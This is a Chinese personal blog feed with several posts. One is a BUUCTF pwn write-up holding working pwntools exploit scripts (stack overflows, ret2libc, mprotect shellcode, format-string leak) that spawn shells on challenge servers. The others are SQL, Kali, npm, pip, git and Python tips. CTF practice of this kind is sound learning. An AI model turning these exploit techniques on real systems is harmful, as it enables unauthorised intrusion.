<h2 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h2><p>图片左上角有一块黑白色块。仔细观察发现黑白色块加起来是八的整数倍。<br>横向解析，黑为1，白为0，然后将其八位一组转ASCII码，得到flag{12345678}</p>
<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><h2 id="请移步篇章三"><a href="#请移步篇章三" class="headerlink" title="请移步篇章三"></a><a href="http://xibai.xyz/2020/02/24/BUU-Misc-three/">请移步篇章三</a></h2>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL中text数据的group By问题处理</title>
    <url>/2019/05/30/SQL%E4%B8%ADtext%E6%95%B0%E6%8D%AE%E7%9A%84group%20by%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="text数据存在于group-by命令里时的错误"><a href="#text数据存在于group-by命令里时的错误" class="headerlink" title="text数据存在于group by命令里时的错误"></a>text数据存在于group by命令里时的错误</h1><p>大多数SQL的<code>group by</code>命令都不支持<code>text</code>格式的数据在其中。<br>如下：<br>任务要求是：查询所有部门详细信息和部门人数<br>需要用到俩个表格建立连接并分组<br>两个表格为：<br>Department，Employee<br><img src="https://img-blog.csdnimg.cn/20190510091442552.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190510091538215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中的<strong>Note</strong>为<strong>TEXT</strong>类型的数据</p>
<p>一般处理应该是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">a.<span class="operator">*</span>,<span class="built_in">count</span>(b.DepartmentID)</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">Department a,Employee b</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">a.DepartmentID<span class="operator">=</span>b.DepartmentID</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">a.DepartmentID,DepartmentName,Note;</span><br></pre></td></tr></table></figure>
<p>但是因为<code>text</code> 数据的存在，会报如下错误：<br><img src="https://img-blog.csdnimg.cn/2019051009251754.png" alt="在这里插入图片描述"></p>
<h1 id="使用视图的解决方法"><a href="#使用视图的解决方法" class="headerlink" title="使用视图的解决方法"></a>使用视图的解决方法</h1><p>所以我们先把其他分组的数据保存在一个视图中，之后再用一个<code>select</code>来调用，命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>建立视图</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span>  YYY</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span></span><br><span class="line">a.DepartmentID,a.DepartmentName,<span class="built_in">count</span>(b.DepartmentID) <span class="keyword">as</span> <span class="string">&#x27;人数&#x27;</span></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">Department a,Employee b</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">a.DepartmentID<span class="operator">=</span>b.DepartmentID</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">a.DepartmentID,a.DepartmentName;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>开始查询</span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">YYY.<span class="operator">*</span>,A.Note</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">YYY,Department A</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">YYY.DepartmentID<span class="operator">=</span>A.DepartmentID;</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/2019051009093656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-PWN(一)</title>
    <url>/2020/05/03/BUU-Pwn-one/</url>
    <content><![CDATA[<p><strong>最近更新：</strong> <em>2020-01-31 22:43</em></p>
<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>pwnの签到</p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>入门溢出覆盖 RIP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>同上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fi = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26624</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fi.recvuntil(<span class="string">&#x27;WOW:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = fi.recv()[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(<span class="built_in">int</span>(flag_addr,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">fi.sendline(payload)</span><br><span class="line"></span><br><span class="line">fi.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>加了个简易路障，输入长度被限制不能直接溢出，但是程序会把‘I’替换为‘you’，计算一下就会知道，只要输入21个‘I’即可进行后续的溢出操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28810</span>)</span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">21</span> + <span class="string">&#x27;a&#x27;</span> + p32(<span class="number">0x8048f13</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>依旧是简单的额变量溢出覆盖，将<code>float</code>变量覆盖为相应的十六进制即可。这里可以直接百度 float 变量的数据是如何解析的，然后构造相应的二进制或十六进制数值即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29674</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>我丢！！！Ubuntu18坑死窝惹555<br>用了好几天时间换各种姿势尝试拿服务器shell，本地的kali明明可以一遍通QAQ。最后无奈搜了大佬的wp才知道Ubuntu18的堆栈对齐问题导致无法执行<code>system</code>函数，而且最后也不知道详细的底层机制原理是啥，只知道Ubuntu18的堆栈对齐很迷，这道题是32字节的对齐宽度，在payload前面加一个<code>ret</code>的地址即可完成对齐。<br>另外，中间尝试通过<code>gets</code>和<code>__isoc99_scanf</code>函数向bss段写入数据，但是无法写入(工具查看是有RW权限的)，疑惑，实在没找到原因，如果写入成功的话或许可以尝试<code>ret2csu</code>来执行<code>execve</code>，这应该不会受到栈对齐的影响.<br>(数次调试后发现，该程序bss段无法写入数据md，不过发现<code>one_gadget</code>可以用)</p>
<p><strong>继续查资料依旧没有找到Ubuntu18栈对齐对函数能否成功执行的影响原理，只知道堆栈指针对齐一般是16字节或32字节的对齐，其会在某些情况下影响程序的正常执行，而这道题显然就遇到了这‘某些情况’</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/BUU/pwn/libc/ubuntu18/64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">encrypt = p64(elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>])</span><br><span class="line">libc_start_main_addr = p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">libc_start_main = libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">puts = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rdi_ret = p64(<span class="number">0x400c83</span>)</span><br><span class="line">binsh_64 = libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + rdi_ret + libc_start_main_addr + puts + encrypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26004</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\x0a\x0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tmp_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">base = tmp_addr - libc_start_main</span><br><span class="line">binsh_64 += base</span><br><span class="line">system += base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(<span class="number">0x4006b9</span>) + rdi_ret + p64(binsh_64) + p64(system) + encrypt</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>简单ROP，用<code>\x00</code>绕过<code>strncmp</code>检测，然后溢出复写第二个<code>read</code>读入长度为255.<br>利用write函数泄露got表中已经被用过的函数地址，计算基地址，本题直接给出so文件，直接计算<code>system</code>函数和<code>/bin/sh</code>的地址。这里system直接攻击成功。不再尝试其他姿势。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29623</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(write) + p32(main) + p32(<span class="number">1</span>) + p32(write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>() + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>我吐了，emp无敌。这道题看源码发现和上面<code>ciscn_2019_c_1</code>一模一样，但是exp打了好几遍就是打不通，本地是可以通的。无奈搜别的大佬的wp看是不是又有什么奇怪的姿势，发现确实是和上一题的共用一个exp就可以。<br>这里看到大佬用的<code>libcsearcher</code>而非BUU直接给出的libc，就去试了下libcsearcher尝试是不是libc的问题，然后就神奇的通了。。。但这里不是吐血的地方！<br>最神奇和吐血的地方是，这个时候因为<strong>觉得BUU一般的pwn题应该就是用的直接给出的对应的libc才对</strong>就把后来加上的<code>libcsearcher</code>相关的代码<strong>全删了用之前没改的代码，这一次突然就通了</strong>！？？？吐血emmm</p>
<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>这道题感觉远程的文件权限是不是没分配好，也可能是故意为之，毕竟题目里放了一堆函数，然后给一个假的后门。<br>这里get到知识点，<code>mprotect</code>函数修改内存权限，然后向其中写入shellcode进行调用getshell。</p>
<p>利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28183</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="第五空间2019决赛-PWN5"><a href="#第五空间2019决赛-PWN5" class="headerlink" title="[第五空间2019决赛] PWN5"></a>[第五空间2019决赛] PWN5</h2><p>我与bug，同生共死！！！<br>这道题就是非常简单的格式化输出题目，<code>%s</code>or<code>%n</code>都可以秒，不过用<code>%s</code>会有玄学失败bug（ps：至少我会有玄学失败bug，如果未来有刷buu的萌新看到这里不用疑惑，先做再说，不过估计也没人会看到嘿嘿嘿）<br>题目本身很简单，读取了四字节随机数，然后输入一个整数和随机数比较，一样就直接shell。读取随机数的操作在输入buf之前，也就是可以利用格式化输出的漏洞修改或者直接输出随机数内容。然后直接输入一直数值获取shell。</p>
<p>这个脚本是用<code>%s</code>读取随机数的内容然后直接输入。运行的时候概率性fail（吐血）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28350</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + <span class="string">&#x27;%10$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">6</span>))</span><br><span class="line">tmp = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">p.sendline(<span class="built_in">str</span>(tmp))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Git Clone下载慢解决</title>
    <url>/2019/04/21/git%20clone%E4%B8%8B%E8%BD%BD%E6%85%A2/</url>
    <content><![CDATA[<p>git clone命令下载文件时特别慢基本只有几kb每秒，要解决这个问题感觉和上p站原理类似，应该都是因为访问外网的原因<br>修改hosts，直接让计算机访问其IP<br>搜了下大佬的方案，发现确实是dns解析的问题。所以直接添加github的ip地址到hosts文件：<br>在其中增加：</p>
<pre><code> 151.101.72.249 github.global.ssl.fastly.net  
 13.250.177.223 github.com
</code></pre><p>然后重启网络服务即可：</p>
<pre><code>ipconfig /flushdns
</code></pre><p>然而，需要注意的是，github的ip地址有可能会变更，所以，我们有时需要重新更新github的ip地址。</p>
<p><code>github.global.ssl.fastly.net</code> 的ip地址可以通过<code>ping</code>来获得，而<code>github.com</code>因为把<code>ping</code>命令给禁用掉了，需要使用 <code>IPAddress.com</code> 或者 <code>http://tool.chinaz.com</code> 来得到<code>github.com</code>的ip地址，然后把这两个获得的地址更新到dns缓存即可。</p>
<h2 id="我查github-com的IP时发现有好几个，就全保存了"><a href="#我查github-com的IP时发现有好几个，就全保存了" class="headerlink" title="我查github.com的IP时发现有好几个，就全保存了"></a>我查<code>github.com</code>的IP时发现有好几个，就全保存了</h2><p>来源：CSDN<br>参考链接：<a href="https://blog.csdn.net/vincentuva/article/details/84195775">https://blog.csdn.net/vincentuva/article/details/84195775</a></p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/02/14/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Kali安装中文输入法后不能进入系统</title>
    <url>/2019/10/30/kali%E7%9A%84%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95-%E8%90%8C%E6%96%B0%E5%BF%85%E7%9C%8B/</url>
    <content><![CDATA[<h1 id="谷歌拼音输入法"><a href="#谷歌拼音输入法" class="headerlink" title="谷歌拼音输入法"></a>谷歌拼音输入法</h1><p><strong>老版kali</strong>我不了解，2019之后的<strong>新版kali</strong>自带<code>iBus</code>框架，按道理应该没有的，总之我装的<code>kali</code>确实都自带它，他会和<code>fcitx</code>框架发生冲突，然后产生我一个小白不了解的反应导致系统重启后就崩了，只能<code>crtl+Alt+F3</code>进入命令行界面操作系统，但这种界面不支持中文而且有超级多的不便，并且俩个框架产生的影响经我尝试多次后发现只有 <strong>还原</strong> 和 <strong>重装</strong> 能解决，而卸载<code>iBus框架</code>又会暂时卡死系统，不知道之后会产生什么影响，所以，pass掉 <code>fcitx框架</code> 的谷歌中文输入法（虽然我挺想用用）。</p>
<h1 id="iBus-拼音输入法"><a href="#iBus-拼音输入法" class="headerlink" title="iBus-拼音输入法"></a>iBus-拼音输入法</h1><p>上面说了，19年之后的<code>kali</code>（至少我装过的）都是自带<code>iBus框架</code>的，所以直接安装<code>iBus框架</code>的<strong>拼音输入法</strong>即可，简单实在。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install ibus ibus-pinyin -y &amp;&amp; reboot</span><br></pre></td></tr></table></figure>
<p>直接不让系统底层的冲突出现就行了，大佬的话另说，反正小白是真的没办法了，百度谷歌找了一个月的方法都无效。。。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Npm Install 安装过慢：</title>
    <url>/2019/04/11/npm%20install%20%E5%AE%89%E8%A3%85%E8%BF%87%E6%85%A2/</url>
    <content><![CDATA[<p>一，简单省事版<br>因为资源在国外，所以安装一些包要访问国外网络，该命令可以改变装包的资源点，使访问外网变为访问国内网</p>
<pre><code>npm install -gd express --registry=http://registry.npm.taobao.org
</code></pre><p>只需要使用–registry参数指定镜像服务器地址，为了避免每次安装都需要—registry参数，可以使用如下命令进行永久设置：</p>
<pre><code>npm config set registry http://registry.npm.taobao.org
</code></pre><p>二，开头麻烦一丢丢版</p>
<pre><code>npm install -g cnpm -registry=https://registry.npm.taobao.org
</code></pre><p>该代码用来安装淘宝团队的npm。安装完成后遇到需要<code>npm install</code>的时候直接<code>cnpm install</code> 即可（ps：不知道是不是我电脑的原因，我用<code>cnpm</code>的时候命令反应贼慢。。。）<br>（基于上一个ps的ps：我有一个小习惯，一个命令提示符正在跑的时候需要用其他命令我会再开一个新的命令提示符一起跑，之前<code>cnpm</code>安装命令刚回车就不动了是因为我有一个正在跑的npm命令，<code>cnpm</code>和<code>npm</code>不能同时运行。。。。）</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>Pip安装过慢</title>
    <url>/2019/04/13/pip%E5%AE%89%E8%A3%85%E8%BF%87%E6%85%A2/</url>
    <content><![CDATA[<p>因为正常是使用的国外官方安装源所以翻墙会导致安装速度贼慢，换国内安装源<br>国内源：<br>新版ubuntu要求使用https源，要注意。<br>清华：<code>https://pypi.tuna.tsinghua.edu.cn/simple</code><br>阿里云：<code>http://mirrors.aliyun.com/pypi/simple/</code><br>中国科技大学：<code>https://pypi.mirrors.ustc.edu.cn/simple/</code><br>华中理工大学：<code>http://pypi.hustunique.com/</code><br>山东理工大学：<code>http://pypi.sdutlinux.org/</code><br>豆瓣：<code>http://pypi.douban.com/simple/</code></p>
<p>使用：</p>
<pre><code>   pip install -i 源地址 包名
</code></pre><p> 永久性解决方案：</p>
<pre><code>   windows下在个人用户目录下
   c:\users\[自己的电脑用户名]\中新建文件夹 pip，再新建文件pip.ini  ( ini后缀为配置文件类型 )
</code></pre><p> 在ini文件中配置源地址</p>
<pre><code>[global]
index-url = https://pypi.tuna.tsinghua.edu.cn/simple

[install]
trusted-host=mirrors.aliyun.com
</code></pre>]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2的中文显示乱码</title>
    <url>/2019/11/05/python2.x%E4%B8%AD%E6%96%87%E8%BE%93%E5%87%BA%E4%B8%80%E7%9B%B4%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<p>首先确认自己<strong>有没有添加用中文时的必备开头</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
<p>若无开头一般是python2.x默认使用ASCII码导致的问题</p>
<p>如果文件开头<strong>已经添加过了该注释</strong>，<strong>中文</strong>输出<strong>依旧乱码</strong>，<em>大概率是文件编码格式与python的设置冲突导致</em></p>
<p>python2.x默认使用ASCII码，所以添加该注释头让其识别unicode码，但是有时所创建的<strong>文件其默认编码</strong>就是<code>Unicode</code>或者<code>utf-8</code>编码，<strong>此时其就会与python2.x产生冲突，致使python2.x在执行脚本时始终无法正确输出中文</strong></p>
<p>只需将要使用的文件编码格式改为<code>ANSI</code>编码即可解决冲突</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python安装密码库-小白</title>
    <url>/2019/09/16/python%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93pycrypto/</url>
    <content><![CDATA[<h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><p><strong>低版本py3</strong>可选择使用<code>wheel</code>方式或<code>exe</code>方式进行安装。<br>在该网址下载对应版本的<code>.whl</code>或<code>exe</code>文件。</p>
<p>  <a href="http://www.voidspace.org.uk/python/pycrypto-2.6.1/">http://www.voidspace.org.uk/python/pycrypto-2.6.1/</a></p>
<h3 id="wheel方式"><a href="#wheel方式" class="headerlink" title="wheel方式"></a>wheel方式</h3><p>将其放在py3安装目录下的scripts文件夹中。<br>安装姿势：<br>打开<code>cmd</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install wheel</span><br><span class="line">pip3 install xxx.whl</span><br><span class="line">(xxx是下载的whl文件的名字)</span><br></pre></td></tr></table></figure>
<h3 id="exe方式"><a href="#exe方式" class="headerlink" title="exe方式"></a>exe方式</h3><p>双击运行，和普通软件安装程序类似</p>
